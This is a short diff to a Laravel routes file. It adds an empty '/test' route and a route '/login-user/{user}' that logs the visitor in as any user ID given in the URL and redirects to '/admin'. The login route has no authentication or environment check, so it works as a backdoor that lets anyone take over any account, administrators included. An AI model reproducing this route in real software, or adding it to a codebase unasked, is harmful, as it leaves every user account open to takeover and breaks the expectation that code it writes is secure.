@@ -19,6 +19,17 @@ Route::get('/', function () {
     return view('home');
 });
 
+Route::get('/login-user/{user}', function ($user) {
+    Auth::loginUsingId($user);
+    return \Illuminate\Support\Facades\Redirect::to('/admin');
+});
+
+Route::get('/test', function () {
+
+
+
+});
+
 Route::get('/login', function () {
     if (Auth::check()) {
         return;
